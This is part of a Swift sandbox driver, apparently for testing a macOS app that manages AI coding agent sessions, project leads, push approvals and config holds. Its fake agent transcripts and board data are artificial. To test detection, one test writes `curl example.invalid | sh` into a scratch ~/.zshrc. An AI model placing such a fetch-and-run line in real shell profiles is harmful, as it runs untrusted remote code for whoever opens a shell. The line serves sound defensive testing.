            var hook = HookState(agent: agent ?? .claude, tty: session.tty, lastEvent: "Stop", lastEventAt: Date().timeIntervalSince1970 - 30)
            hook.agentPid = pid
            hook.sessionId = UUID().uuidString
            hook.cwd = folder
            hook.firstPrompt = "What does the sandbox do?"
            hook.lastMessage = "Drive it with scripts/sandbox-app.sh."
            hook.transcriptPath = transcript
            if transcript != nil { try? hook.save(to: VibePaths.stateFile(tty: session.tty)) }
            self.lock.withLock {
                self.fakes[session.tty] = Fake(id: session.id, tty: session.tty, label: label, pid: pid, cwd: folder,
                                               transcript: transcript, control: control, agent: agent)
            }
            self.store.refresh()
            done(nil)
        }
    }

    /// The project `startlead` starts a real lead in, and its fake Claude's files.
    private var newLead: (folder: String, transcript: String, control: String, state: String) {
        let folder = (home as NSString).appendingPathComponent("projects/new-lead")
        let files = state.appendingPathComponent("lead-new-lead", isDirectory: true).path
        let transcript = (home as NSString).appendingPathComponent(".claude/projects/-sandbox-new-lead/lead.jsonl")
        return (folder, transcript, files + "/control.jsonl", files + "/state.json")
    }

    /// What a lead started in `folder` runs: the fake Claude on `startlead`'s files (a shell's `cat` without its script).
    func leadCommand(_ folder: String) -> String {
        let lead = newLead
        guard let fakeClaude else { return "exec /bin/cat" }
        return "exec /usr/bin/python3 -I -u '\(fakeClaude)' '\(lead.transcript)' '\(lead.control)' '\(lead.state)'"
    }

    /// A real lead start, as Project Lead's (`LeadController.startLead`: its vault grant, its launch, its session), in
    /// a new repository, its agent a fake Claude. After `run --empty` it's the first thing to ask the session host.
    func startRealLead(_ reply: @escaping (Bool, String) -> Void) {
        let lead = newLead
        let files = FileManager.default
        for path in [lead.folder, (lead.transcript as NSString).deletingLastPathComponent, (lead.state as NSString).deletingLastPathComponent] {
            try? VibePaths.ensurePrivate(URL(fileURLWithPath: path))
        }
        if !files.fileExists(atPath: lead.folder + "/.git") {
            try? VibePaths.writePrivate(Data("# New lead\n".utf8), to: URL(fileURLWithPath: lead.folder + "/README.md"))
            for args in [["init", "-q", "-b", "main"], ["config", "user.email", "sandbox@example.invalid"], ["config", "user.name", "Sandbox"],
                         ["add", "README.md"], ["commit", "-q", "-m", "First commit"]] {
                guard Git.run(args, in: lead.folder).ok else { return reply(false, "couldn't make its repository: git \(args.joined(separator: " "))") }
            }
        }
        try? VibePaths.writePrivate(Data(Driver.firstTurn.utf8), to: URL(fileURLWithPath: lead.transcript))
        try? VibePaths.writePrivate(Data(), to: URL(fileURLWithPath: lead.control))
        try? files.removeItem(atPath: lead.state)
        let hostWas = host.state
        let refusedBefore = refused.count
        leads.startLead(in: lead.folder)
        let label = "Lead · new-lead"
        waitFor({ [weak self] in
            guard let self else { return true }
            return self.host.sessions.contains { $0.label == label && $0.isLive } || self.refused.count > refusedBefore
        }) { [weak self] _ in
            guard let self else { return }
            guard let session = self.host.sessions.first(where: { $0.label == label && $0.isLive }) else {
                return reply(false, "the lead didn't start: \(self.refused.dropFirst(refusedBefore).joined(separator: "; "))")
            }
            self.adopt(session, label: label, folder: lead.folder, transcript: lead.transcript, control: lead.control, agentState: lead.state,
                       agent: .claude) { problem in
                if let problem { return reply(false, problem) }
                self.chat("Lead") { ok, text in
                    reply(ok, ok ? "lead started (the host was \(hostWas) before): \(text)" : text)
                }
            }
        }
    }

    /// The fake agent's pid, from the state it writes once it's drawn (checked every 0.1 s, `tries` times).
    private func waitForPid(_ path: String, tries: Int, _ done: @escaping (Int32?) -> Void) {
        let object = FileManager.default.contents(atPath: path).flatMap { try? JSONSerialization.jsonObject(with: $0) } as? [String: Any]
        if let pid = (object?["pid"] as? NSNumber)?.int32Value { return done(pid) }
        guard tries > 0 else { return done(nil) }
        DispatchQueue.main.asyncAfter(deadline: .now() + 0.1) { self.waitForPid(path, tries: tries - 1, done) }
    }

    /// The fake session's conversation so far: a question and an answer with some markdown.
    static let firstTurn: String = {
        let stamp = ISO8601DateFormatter().string(from: Date().addingTimeInterval(-60))
        let answer = "It's a copy of VibeSwitcher built from this worktree, on a session host of its own:\\n\\n"
            + "- the real window, chat and settings\\n- fake sessions only, like this one\\n- nothing of yours: "
            + "its own defaults, folder and host\\n\\nDrive it with `scripts/sandbox-app.sh`."
        return """
        {"type":"user","uuid":"u0","timestamp":"\(stamp)","isSidechain":false,"message":{"role":"user","content":"What does the sandbox do?"}}
        {"type":"assistant","uuid":"a0","timestamp":"\(stamp)","isSidechain":false,"message":{"role":"assistant","content":[{"type":"text","text":"\(answer)"}]}}

        """
    }()

    /// The sandbox's stand-in for the session host's vault for push requests: the fake lead's session asks through
    /// it, and the app reads and settles through it as itself, as with the host's.
    let pushVault = LeadVault.Book()

    /// The fake lead asks to push (push_remote's request, `LeadPush`): its folder made a scratch repository with a
    /// scratch bare remote as origin (in the sandbox's state, never GitHub, never the network), three commits ahead of
    /// it, and the request filed in `pushVault` as the lead's session files it. `click` or `decline` settles it as the
    /// card's buttons do: Push pushes to that bare remote.
    func pushRequest(_ how: String, _ done: @escaping (String?) -> Void) {
        guard fakeList.contains(where: { $0.label.hasPrefix("Lead · ") }) else { return done("no fake lead: lead first") }
        let root = ((home as NSString).appendingPathComponent("projects/sandbox-lead") as NSString).standardizingPath
        if how == "click" || how == "decline" {
            guard let request = leads.pushes.open[root] else { return done("no push request open: push first") }
            leads.pushes.settle(root, request, push: how == "click")
            return waitFor({ [weak self] in self?.leads.pushes.notices[root] != nil }) { [weak self] met in
                self?.settle { done(met ? nil : "the click didn't settle") }
            }
        }
        let origin = state.appendingPathComponent("push/origin.git").path
        let book = pushVault, folder = state.appendingPathComponent("push/vault")
        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
            let fail = { (text: String) in DispatchQueue.main.async { done(text) } }
            func git(_ args: [String], in dir: String) -> Git.Result {
                Shell.run(executable: "/usr/bin/git", args: ["-c", "user.name=Sandbox", "-c", "user.email=sandbox@example.invalid", "-c", "commit.gpgsign=false"] + args,
                          in: dir, env: Git.environment, timeout: 60, grace: 1)
            }
            let fileManager = FileManager.default
            if !fileManager.fileExists(atPath: origin) {
                try? fileManager.createDirectory(atPath: (origin as NSString).deletingLastPathComponent, withIntermediateDirectories: true)
                guard git(["init", "-q", "--bare", "-b", "main", origin], in: (origin as NSString).deletingLastPathComponent).status == 0 else { return fail("couldn't make the bare remote") }
            }
            if !fileManager.fileExists(atPath: root + "/.git") {
                try? "# Sandbox lead\n".write(toFile: root + "/README.md", atomically: true, encoding: .utf8)
                for args in [["init", "-q", "-b", "main"], ["add", "README.md"], ["commit", "-q", "-m", "Start the sandbox project"],
                             ["remote", "add", "origin", origin], ["push", "-q", "origin", "main"]] {
                    let run = git(args, in: root)
                    guard run.status == 0 else { return fail("git \(args.joined(separator: " ")) failed: \(run.error)") }
                }
            }
            for (file, subject) in [("landing.md", "Landing page copy for the launch"), ("hero.md", "Landing hero image and its dark variant"),
                                    ("stats.md", "Cache the stats endpoint")] {
                try? "\(subject) \(UUID().uuidString)\n".write(toFile: root + "/" + file, atomically: true, encoding: .utf8)
                guard git(["add", file], in: root).status == 0, git(["commit", "-q", "-m", subject], in: root).status == 0 else { return fail("couldn't commit \(file)") }
            }
            let tip = git(["rev-parse", "refs/remotes/origin/main"], in: root).output
            let head = git(["rev-parse", "HEAD"], in: root).output
            let ahead = Int(git(["rev-list", "--count", "\(tip)..\(head)"], in: root).output) ?? 0
            let subjects = git(["log", "--format=%h %s", "\(tip)..\(head)"], in: root).output.split(separator: "\n").map(String.init)
            guard case .success(let url) = LeadRemote.url(root: root, remote: "origin") else { return fail("origin's URL can't be read") }
            do {
                let app = book.vault(folder: folder, as: { .app })
                if (try? app.current(.lead, root: root, task: nil)) == nil {
                    try app.bind(try app.startLead(root: root, branch: "main"), root: root, session: "sandbox-lead")
                }
                let lead = book.vault(folder: folder, as: { .session("sandbox-lead") })
                try lead.setGuardedSettings([LeadRemote.urlKey("origin"): LeadVault.hash(url)], root: root)
                try lead.requestPush(LeadPush.Request(commit: head, remote: "origin", branch: "main", url: url, ahead: ahead, subjects: subjects), root: root)
            } catch {
                return fail("the push request wasn't filed: \(error)")
            }
            DispatchQueue.main.async {
                guard let self else { return }
                self.leads.refresh()
                self.waitFor({ [weak self] in self?.leads.pushes.open[root]?.commit == head }) { [weak self] met in
                    self?.settle { done(met ? nil : "the card didn't read the request") }
                }
            }
        }
    }

    /// The agents' config held for the fake lead (`ConfigSeal`): sealed, a worker of its team bound, then the sandbox's
    /// own home's ~/.claude/settings.json, ~/.zshrc and seven files in ~/.claude/skills changed (never the user's), and the lead's look holds them; its
    /// card, with Accept, is under the lead's chat. `accept` clicks it.
    func configHold(_ how: String, _ done: @escaping (String?) -> Void) {
        guard fakeList.contains(where: { $0.label.hasPrefix("Lead · ") }) else { return done("no fake lead: lead first") }
        let root = ((home as NSString).appendingPathComponent("projects/sandbox-lead") as NSString).standardizingPath
        if how == "accept" {
            guard leads.configHolds.held[root] != nil else { return done("nothing held: confighold first") }
            leads.configHolds.accept(root)
            return waitFor({ [weak self] in self?.leads.configHolds.held[root] == nil }) { [weak self] met in
                self?.settle { done(met ? nil : "the click didn't seal it") }
            }
        }
        let book = pushVault, folder = state.appendingPathComponent("push/vault"), home = self.home
        book.configHome = home
        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
            let fail = { (text: String) in DispatchQueue.main.async { done(text) } }
            do {
                try FileManager.default.createDirectory(atPath: root, withIntermediateDirectories: true)
                try FileManager.default.createDirectory(atPath: home + "/.claude", withIntermediateDirectories: true)
                // A status line naming a script, so the card shows a settings file's scripts too.
                let statusLine = #""statusLine":{"type":"command","command":"~/.claude/status.sh"}"#
                try "echo status\n".write(toFile: home + "/.claude/status.sh", atomically: true, encoding: .utf8)
                try #"{"model":"opus",\#(statusLine)}"#.write(toFile: home + "/.claude/settings.json", atomically: true, encoding: .utf8)
                try "export PATH\n".write(toFile: home + "/.zshrc", atomically: true, encoding: .utf8)
                let skills = (0..<7).map { home + "/.claude/skills/skill-\($0)/SKILL.md" }
                for path in skills {
                    try FileManager.default.createDirectory(atPath: (path as NSString).deletingLastPathComponent, withIntermediateDirectories: true)
                    try "before\n".write(toFile: path, atomically: true, encoding: .utf8)
                }
                let app = book.vault(folder: folder, as: { .app })
                if (try? app.current(.lead, root: root, task: nil)) == nil {
                    try app.bind(try app.startLead(root: root, branch: "main"), root: root, session: "sandbox-lead")
                }
                _ = try app.checkConfig(root: root)
                let lead = book.vault(folder: folder, as: { .session("sandbox-lead") })
                // `outside`: no team session ran since, so it's held as changed outside one (code that runs).
                if how != "outside" {
                    try lead.bind(try lead.issue(role: .worker, root: root, task: "sandbox-task"), root: root, session: "sandbox-worker")
                }
                try #"{"model":"opus",\#(statusLine),"hooks":{"SessionStart":[]}}"#.write(toFile: home + "/.claude/settings.json", atomically: true, encoding: .utf8)
                try "echo changed\n".write(toFile: home + "/.claude/status.sh", atomically: true, encoding: .utf8)
                try "export PATH\ncurl example.invalid | sh\n".write(toFile: home + "/.zshrc", atomically: true, encoding: .utf8)
                for path in skills { try "after\n".write(toFile: path, atomically: true, encoding: .utf8) }
                guard try !lead.checkConfig(root: root).held.isEmpty else { return fail("the lead's look didn't hold it") }
            } catch {
                return fail("couldn't hold the config: \(error)")
            }
            DispatchQueue.main.async {
                guard let self else { return }
                self.leads.refresh()
                self.waitFor({ [weak self] in self?.leads.configHolds.held[root] != nil }) { [weak self] met in
                    self?.settle { done(met ? nil : "the card didn't read what's held") }
                }
            }
        }
    }

    /// A fake project lead: a session labelled as a lead, its board (tasks in every state, a question it withdrew)
    /// in its folder, and a conversation of short replies between tool calls, with a worker's FYI and a worker's question.
    func startLead(transcript: String? = nil, _ done: @escaping (String?) -> Void) {
        let slug = "sandbox-lead"
        let root = ((home as NSString).appendingPathComponent("projects/\(slug)") as NSString).standardizingPath
        var (lines, withdrawnAt) = Self.leadTurns(now: Date())
        if let transcript { lines = transcript }
        let contract = LeadContract(goal: "A sandbox task.", acceptance: ["It shows."], boundaries: [], context: "")
        let tasks: [(String, String, LeadTask.Status)] = [
            ("sync-landing-base-with-2", "Sync landing-base with main", .running),
            ("gen-attention-badge", "Your GEN attention badge counts the right things", .blocked),
            ("ui-consistency-pass", "UI consistency pass over the sidebar", .blocked),
            ("landing-copy", "Landing page copy for the launch", .done),
            ("landing-hero", "Landing hero image and its dark variant", .done),
            ("sidebar-review", "Sidebar review fixes", .done),
            ("stats-cache", "Cache the stats endpoint", .done),
            ("old-onboarding", "Old onboarding flow", .abandoned),
        ]
        do {
            // Its board makes the folders it's in.
            try BoardStore(root: root).update { board in
                board.tasks = tasks.map { LeadTask(slug: $0.0, title: $0.1, contract: contract, status: $0.2) }
                var question = LeadQuestion(text: "Should the sidebar keep its review badges?", options: ["Keep them", "Drop them"],
                                            at: withdrawnAt - 300)
                question.withdrawnAt = withdrawnAt
                question.withdrawReason = "User asked to re-ask it. Sidebar review found: (1) the badges overlap the titles, (2) they don't clear when read."
                board.questions = [question]
            }
        } catch {
            return done("couldn't write the lead's board: \(error)")
        }
        startFake(label: "Lead · \(slug)", slug: slug, transcript: lines, done)
    }

    /// A fake worker on the fake lead's running task, in its worktree, named on the board as that task's worker; with
    /// `title`, titled as Claude Code titles it ("worker-<slug>").
    func startWorker(title: String? = nil, _ done: @escaping (String?) -> Void) {
        let lead = "sandbox-lead", slug = "sync-landing-base-with-2", label = "Worker: Sync landing-base with main"
        guard fakeList.contains(where: { $0.label.hasPrefix("Lead · ") }) else { return done("no fake lead: lead first") }
        startFake(label: label, slug: "\(lead)/.vibeswitcher/worktrees/\(slug)", title: title) { [weak self] problem in
            guard let self else { return }
            if let problem { return done(problem) }
            guard let fake = self.fakeList.first(where: { $0.label == label }) else { return done("the worker isn't listed") }
            let root = ((self.home as NSString).appendingPathComponent("projects/\(lead)") as NSString).standardizingPath
            do {
                try BoardStore(root: root).update { board in
                    guard let index = board.tasks.firstIndex(where: { $0.slug == slug }) else { return }
                    board.tasks[index].worker = fake.id.uuidString
                    board.tasks[index].worktree = fake.cwd
                }
            } catch {
                return done("couldn't write the lead's board: \(error)")
            }
            done(nil)
        }
    }

    /// 2026-10-28's sidebar: the fake lead's worker and a verifier on its running task, titled as Claude Code 2.1.311
    /// names sessions ("worker-<slug>", "verify-<slug>"), and the lead's agent moved into its `.vibeswitcher/worktrees`
    /// (its hooks' cwd, as after a `cd` there). Its team still folds under it.
    func startNamedTeam(_ done: @escaping (String?) -> Void) {
        let slug = "sync-landing-base-with-2"
        guard let lead = fakeList.first(where: { $0.label.hasPrefix("Lead · ") }) else { return done("no fake lead: lead first") }
        startWorker(title: "worker-\(slug)") { [weak self] problem in
            guard let self else { return }
            if let problem { return done(problem) }
            self.startFake(label: "Verifier: Sync landing-base with main", slug: "sandbox-lead/.vibeswitcher/worktrees/\(slug)",
                           title: "verify-\(slug)") { [weak self] problem in
                guard let self else { return }
                if let problem { return done(problem) }
                let file = VibePaths.stateFile(tty: lead.tty)
                guard var hook = HookState.load(from: file) else { return done("the lead has no hook state") }
                hook.cwd = (lead.cwd as NSString).appendingPathComponent(".vibeswitcher/worktrees")
                do { try hook.save(to: file) } catch { return done("couldn't move the lead's cwd: \(error)") }
                self.store.refresh()
                let moved = hook.cwd
                self.waitFor({ [weak self] in self?.store.sessions.first { $0.tty == lead.tty }?.cwd == moved }) { met in
                    done(met ? nil : "the lead's session didn't read its new cwd")
                }
            }
        }
    }

    /// An open question for you on the fake lead's board (`text`, or a made-up one), or (`answer`) its open questions
    /// answered; done once the lead's session reads it (`Session.leadAsks`).
    func ask(_ text: String, answer: Bool, _ done: @escaping (String?) -> Void) {
        guard let lead = fakeList.first(where: { $0.label.hasPrefix("Lead · ") }) else { return done("no fake lead: lead first") }
        let root = ((home as NSString).appendingPathComponent("projects/sandbox-lead") as NSString).standardizingPath
        do {
            try BoardStore(root: root).update { board in
                if answer {
                    for index in board.questions.indices where board.questions[index].isOpen {
                        board.questions[index].answer = board.questions[index].options.first ?? "Yes"
                        board.questions[index].answeredAt = Date().timeIntervalSince1970
                    }
                } else {
                    board.questions.append(LeadQuestion(text: text.isEmpty ? "Ship the landing page to everyone, or only to the testers first?" : text,
                                                        options: ["Everyone", "Testers first"]))
                }
            }
        } catch {
            return done("couldn't write the lead's board: \(error)")
        }
        waitFor({ [weak self] in self?.store.sessions.first { $0.tty == lead.tty }?.leadAsks == !answer }) { met in
            done(met ? nil : "the lead's session didn't read its board's question")
        }
    }

    /// Made-up messages between the sandbox's lead and other projects' leads, oldest first: two sent, one received,
    /// one refused for a credential's shape, one that found no lead.
    static func leadMail(now: Double) -> [LeadMail.Record] {
        [
            LeadMail.Record(at: now - 3_400, from: "sandbox-lead", to: "example-api", kind: .question,
                            text: "Does /v2/sessions still return the host id as a string? The sidebar's new grouping reads it.",
                            outcome: .delivered, detail: "Delivered to the lead of example-api while it works: it gets it at its next step."),
            LeadMail.Record(at: now - 2_900, from: "example-api", to: "sandbox-lead", kind: .answer,
                            text: "Yes, a string, and it stays one through v2. v3 (next month) makes it a UUID object; I'll report when that lands.",
                            outcome: .delivered, detail: "Delivered: typed in as the lead of sandbox-lead's next prompt."),
            LeadMail.Record(at: now - 1_500, from: "sandbox-lead", to: "example-api", kind: .report,
                            text: "Here's the staging token so you can try it: [masked]",
                            outcome: .refused, detail: "Refused, not sent: the text holds something shaped like a credential (API key): never send one to another lead; leave it out."),
            LeadMail.Record(at: now - 600, from: "sandbox-lead", to: "example-docs", kind: .report,
                            text: "The sidebar grouping merged: the screenshots in the guide's Sessions page are out of date.",
                            outcome: .noLead, detail: "Not sent: no lead is running for example-docs on this Mac right now."),
            LeadMail.Record(at: now - 120, from: "sandbox-lead", to: "example-api", kind: .report,
                            text: "The grouping is on main; it reads the host id as a string, as you said.",
                            outcome: .waiting, detail: "Sent: the lead of example-api is between turns, so it waits in its inbox and VibeSwitcher wakes it to read it."),
        ]
    }

    /// `leadmail`: the made-up messages written to the fake lead's record, as tell_lead keeps them, and its Team tab shown.
    func leadMail(_ done: @escaping (String?) -> Void) {
        guard fakeList.contains(where: { $0.label.hasPrefix("Lead · ") }) else { return done("no fake lead: lead first") }
        let root = ((home as NSString).appendingPathComponent("projects/sandbox-lead") as NSString).standardizingPath
        do {
            for record in Driver.leadMail(now: Date().timeIntervalSince1970) { try LeadMail.append(record, root: root) }
        } catch {
            return done("couldn't write the lead's mail record: \(error)")
        }
        UserDefaults.standard.set("team", forKey: "inspectorTab")
        leads.refresh()
        done(nil)
    }

    /// More on the fake lead's board, for what the phone and the Lead view show of it: a proposal whose timer runs, a
    /// blocking question the lead revised, the merged tasks' merges, a task the risk check raised to audit, one
    /// reverted, an all-done card with its receipts, and two results.
    func extras(_ done: @escaping (String?) -> Void) {
        guard fakeList.contains(where: { $0.label.hasPrefix("Lead · ") }) else { return done("no fake lead: lead first") }
        let root = ((home as NSString).appendingPathComponent("projects/sandbox-lead") as NSString).standardizingPath
        let now = Date().timeIntervalSince1970
        let contract = LeadContract(goal: "A sandbox task.", acceptance: ["It shows."], boundaries: [], context: "")
        do {
            try BoardStore(root: root).update { board in
                for index in board.tasks.indices where board.tasks[index].status == .done {
                    board.tasks[index].merged = LeadMergeRecord(commit: "abc\(index)def0", tested: true, audited: false, at: now - Double(index + 1) * 1_800)
                    board.tasks[index].review = LeadTask.Review.none
                }
                var raised = LeadTask(slug: "clean-ended-folders", title: "Clean up ended sessions' folders", contract: contract, status: .review)
                raised.review = .audit
                raised.since = now - 120
                raised.riskRaised = LeadRiskRaise(reason: "it deletes files (Sources/Cleanup.swift: try fm.removeItem(at: folder))", commit: "abc1234def0", byModel: false)
                var reverted = LeadTask(slug: "paste-images", title: "Paste images into the chat", contract: contract, status: .reverted)
                reverted.merged = LeadMergeRecord(commit: "abc9def0", tested: true, audited: false, at: now - 6_000)
                reverted.merged?.revertedBy = "fed9cba0"
                reverted.merged?.revertReason = "The chat froze on a large paste; reverted, a fix-forward is planned."
                board.tasks += [raised, reverted]
                board.questions.append(LeadQuestion(text: "Ship the hero image as WebP only, or keep a PNG fallback?", options: ["WebP only", "Keep a PNG fallback"],
                                                    priority: .whenever, whyNow: "The landing copy merges next; its images need one format.",
                                                    proposal: "Keep a PNG fallback", decideIn: 10, at: now - 150))
                var revised = LeadQuestion(text: "Launch to the testers on Thursday, or wait for the sidebar fixes?", options: ["Thursday", "Wait for the fixes"],
                                           priority: .blocking, whyNow: "The testers' invite goes out tomorrow morning.", at: now - 900)
                revised.revisions = [LeadQuestion.Revision(text: "Launch to everyone on Thursday?", options: ["Yes", "No"],
                                                           note: "Only the testers get it first", at: now - 400)]
                board.questions.append(revised)
                board.allDone = [Driver.allDoneMark()]
                board.updates = Driver.results(home: home)
                board.refreshScores(now: now)
            }
        } catch {
            return done("couldn't write the lead's board: \(error)")
        }
        done(nil)
    }

    /// The phone's web app, served for this sandbox (`PhoneAccess.serveInSandbox`) on a free port of 127.0.0.1, its
    /// lead views reading this sandbox's leads: STATE/phone.json says where, the phone's token, and the headers
    /// `tailscale serve` would add (a scratch proxy in front of it adds them; the web app is the Mac's, as served).
    private func servePhone(_ reply: @escaping (Bool, String) -> Void) {
        let status = TailscaleCLI.Status(dnsName: "sandbox-mac.tail0000.ts.net", login: "sandbox@example.invalid", httpsAvailable: true)
        let access = phone ?? PhoneAccess(store: store)
        access.hostClient = host
        access.inputAllowed = true
        let phoneDictation = PhoneDictation(keyStore: dictationKey, transcription: OpenAITranscription(client: SandboxTranscriber()),
                                            model: { [weak self] in self?.dictation.model ?? OpenAITranscription.defaultModel },
                                            session: { [weak self] sid in self?.store.sessions.first { $0.identity == sid } })
        access.transcribe = phoneDictation.transcribe
        access.dictationReady = { [weak self] in self?.dictation.keyState == .saved }
        PhoneLeads.wire(access, controller: leads, model: model)
        phone = access
        let port = UInt16.random(in: 50_000...59_999)
        access.serveInSandbox(port: port, status: status) { [weak self] token in
            guard let self else { return }
            guard let token else { return reply(false, "couldn't open 127.0.0.1:\(port); try again") }
            let file = self.state.appendingPathComponent("phone.json")
            let info: [String: Any] = ["url": "http://127.0.0.1:\(port)/", "token": token,
                                       "host": "\(status.dnsName):\(PhoneAccess.httpsPort)", "login": status.login]
            guard let data = try? JSONSerialization.data(withJSONObject: info, options: [.prettyPrinted, .sortedKeys]),
                  (try? VibePaths.writePrivate(data, to: file)) != nil else { return reply(false, "couldn't write \(file.path)") }
            reply(true, "the phone's web app is served on http://127.0.0.1:\(port)/; \(file.path) has its token and headers")
        }
    }

    /// The fake lead's conversation, ending a minute ago: the transcript's lines, and when it withdrew its question.
    static func leadTurns(now: Date) -> (String, Double) {
        var lines: [String] = []
        var clock = now.addingTimeInterval(-600)
        var withdrawnAt = clock.timeIntervalSince1970
        let formatter = ISO8601DateFormatter()
        func add(_ type: String, _ content: Any, usage: Bool = false) {
            clock = clock.addingTimeInterval(15)
            var message: [String: Any] = ["role": type, "content": content]
            if usage { message["model"] = "claude-opus-5-5"; message["usage"] = ["input_tokens": 224_000, "output_tokens": 21_600] }
            let line: [String: Any] = ["type": type, "uuid": "lead-\(lines.count)", "timestamp": formatter.string(from: clock),
                                       "isSidechain": false, "message": message]
            if let data = try? JSONSerialization.data(withJSONObject: line), let text = String(data: data, encoding: .utf8) { lines.append(text) }
        }
        func say(_ text: String) { add("assistant", [["type": "text", "text": text]]) }
        func tool(_ name: String, _ input: [String: Any], _ result: String) {
            let id = "toolu_\(lines.count)"
            add("assistant", [["type": "tool_use", "id": id, "name": name, "input": input]])
            add("user", [["type": "tool_result", "tool_use_id": id, "content": result]])
        }
        add("user", "Sync the landing pages with main, and finish the sidebar review.")
        say("On it. The board first.")
        tool("mcp__vibeswitcher__board", [:], "8 tasks: 1 working, 2 blocked, 4 done, 1 abandoned.")
        say("Two tasks wait on the base. Starting a worker on the sync.")
        tool("mcp__vibeswitcher__start", ["task": "sync-landing-base-with-2"], "Started.")
        say("Started sync-landing-base-with-2.")
        tool("Bash", ["command": "git log --oneline -3 origin/main"], "5f19605 Merge #272\n1a2b3c4 Landing copy\n9f8e7d6 Stats cache")
        // A blank message between two tool calls: nothing to show, so the calls are one row.
        say("   ")
        tool("Read", ["file_path": "/sandbox/docs/landing.md"], "# Landing")
        tool("Grep", ["pattern": "badge"], "Sidebar.swift:42")
        say("The base is at #272; the landing branch is two merges behind.")
        add("user", "[VibeSwitcher · worker sync-landing-base-with-2, not the user] The worker on sync-landing-base-with-2 asks: "
            + "FYI: origin/main 5f19605 tops at #272, so the sync needs no merge from main beyond it. I'll go on with the landing "
            + "copy and report when it's done; nothing for you to decide.\nAnswer with message(sync-landing-base-with-2, …).")
        tool("mcp__vibeswitcher__progress", ["text": "sync: base is #272"], "Noted.")
        say("Noted: nothing to do for the sync.")
        withdrawnAt = clock.addingTimeInterval(7).timeIntervalSince1970
        tool("mcp__vibeswitcher__withdraw_question", ["reason": "User asked to re-ask it."], "Withdrawn.")
        say("Withdrew the sidebar question: I'll ask it again once the review is in.")
        add("user", "[VibeSwitcher · worker ui-consistency-pass, not the user] The worker on ui-consistency-pass asks: "
            + "Should the GEN badge show 99+ past 99, or the exact count?\nAnswer with message(ui-consistency-pass, …).")
        tool("mcp__vibeswitcher__message", ["task": "ui-consistency-pass", "text": "99+"], "Sent.")
        add("assistant", [["type": "text", "text": "Told it 99+. Waiting on the two blocked tasks."]], usage: true)
        return (lines.joined(separator: "\n") + "\n", withdrawnAt)
    }

    var fakeList: [Fake] { lock.withLock { fakes.values.sorted { $0.label < $1.label } } }

    // MARK: The window

    private func openWindow() {
        let actions = WindowActions(
            newSession: { [weak self] preset, _ in self?.startFake(label: preset?.name ?? "Fake Claude") { _ in } },
            endSession: { [weak self] row in row.hostID.map { self?.host.kill($0) } },
            resume: { [weak self] _ in self?.refuse("resuming a conversation (a real agent)") },
            remove: { [weak self] row in
                guard let id = row.hostID else { return }
                self?.window?.pane.forget(id)
                self?.host.remove(id)
            },
            rename: { [weak self] _ in self?.refuse("renaming (an alert)") },
            pause: { [weak self] in self?.store.pause($0, for: $1) },
            resumePaused: { [weak self] in self?.store.resume($0) },
            openInTerminal: { [weak self] _ in self?.refuse("opening Terminal") },
            presets: { [weak self] folder in self?.preferences.presets.presets(for: folder) ?? [] },
            isLive: { [weak self] row in
                guard let id = row.hostID else { return row.session != nil }
                return self?.host.sessions.first { $0.id == id }?.isLive ?? false
            },
            canResume: { _ in false }, resumeCommand: { _ in nil },
            settings: { [weak self] in self?.showSettings(.general) },
            moveToWindow: { [weak self] _ in self?.refuse("moving a Terminal session") },
            startLead: { [weak self] _ in self?.refuse("starting a project lead (a real agent)") },
            projectsFolder: { [weak self] in (self?.home ?? "") + "/projects" },
            projectCreated: { [weak self] folder, _ in self?.refuse("starting a lead in the new project \(folder)") })
        windowActions = actions
        let controller = MainWindowController(store: store, host: host, model: model, actions: actions, leads: leads, briefing: briefing,
                                              dictation: dictation, wallet: walletDesk, boost: boostWatch, shells: shellDesk)
        controller.onBoostMark = { [weak self] in self?.showSettings(.performance, reveal: .boost) }
        controller.pane.configure = { [weak self, weak controller] view in
            guard let self else { return }
            let dark = (view.window ?? controller?.window)?.effectiveAppearance.bestMatch(from: [.darkAqua, .aqua]) == .darkAqua
            view.apply(self.preferences.appearance, darkMode: dark)
        }
        controller.pane.scrollbackLines = preferences.appearance.scrollbackLines
        window = controller
        if let window = controller.window { Sandbox.hide(window) }
        controller.presentOffscreen()
        (NSApp as? SandboxApplication)?.guardWindows()
    }

    /// Calls `done` once the window lists the first fake session (or after 30 s without it).
    private func waitForRow(tries: Int = 300, _ done: @escaping () -> Void) {
        let first = fakeList.first
        if first == nil || model.allRows.contains(where: { $0.hostID == first?.id }) || tries == 0 { return done() }
        DispatchQueue.main.asyncAfter(deadline: .now() + 0.1) { self.waitForRow(tries: tries - 1, done) }
    }

    func showSettings(_ tab: SettingsTab, reveal: SettingsSection? = nil) { showSettings(tab, option: reveal?.option) }

    func showSettings(_ tab: SettingsTab, option: String?) {
        if settings == nil {
            settings = SettingsWindowController(
                preferences: preferences, setup: SetupModel(preferences: preferences, system: .fixed(hooks: [.claude: true, .codex: false], terminal: .notAsked, notifications: .off)),
                phoneAccess: PhoneAccess(store: store), recentProjects: { [] }, showWelcome: { [weak self] in self?.refuse("the welcome window") },
                host: host, briefing: briefing, dictation: dictation, policy: WorkingPolicyEditor(), boost: boostWatch,
                // The sandbox's own projects with a workflow.md, against its own host's vault (the app's proof, as ever).
                floor: ReviewFloorEditor(projects: { [home] in
                    ((try? FileManager.default.contentsOfDirectory(atPath: home + "/projects")) ?? []).map { home + "/projects/" + $0 }
                }),
                // Its own fake passage's peers, whatever the path setting says: never the real passage.
                walletPeers: WalletPeerList(load: { [passage = PassageCommand(executable: walletPassage.appendingPathComponent("passage").path)] _ in
                    WalletPeerList.Read(passage: passage, peers: WalletPeerChoice.list(passage: passage))
                }))
        }
        guard let window = settings?.window else { return }
        Sandbox.hide(window)
        settings?.open(tab: tab, option: option)
        window.orderFrontRegardless()
        Sandbox.hide(window)
    }

    // MARK: The control channel

    /// What `scripts/sandbox-app.sh COMMAND` can ask, with what it does.
    static let commands: [(name: String, help: String)] = [
        ("status", "the sandbox's pid, host, fake sessions, windows and anything it refused"),
        ("chat [TEXT]", "selects the fake session whose title contains TEXT (the first one) and shows its chat"),
        ("terminal", "shows the selected session's terminal instead of its chat"),
        ("drag [option|shift|command]…", "drags the mouse across the shown terminal's first two lines, through the window as a click does (with those keys held), to the view the window's hit test finds there: says which view the click hit, who has the keyboard, the program's mouse mode and what's selected"),
        ("copy", "presses ⌘C as the menu does (to the first responder that takes Copy): says who took it and what the pasteboard holds (the sandbox's own, never yours)"),
        ("paste TEXT", "puts TEXT on the sandbox's pasteboard and presses ⌘V as the menu does: says who took it and the terminal's last lines"),
